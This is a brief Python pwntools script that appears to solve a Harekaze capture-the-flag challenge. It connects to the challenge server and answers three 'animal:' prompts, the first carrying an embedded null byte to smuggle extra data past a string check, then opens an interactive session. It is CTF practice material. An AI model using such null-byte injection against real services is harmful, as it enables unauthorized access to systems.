from pwn import *

r = remote("problem.harekaze.com", 20328)

r.sendlineafter("animal: ", "cow\x00aaaaisoroku")
r.sendlineafter("animal: ", "5unKn0wn")
r.sendlineafter("animal: ", "5unKn0wn")

r.interactive()
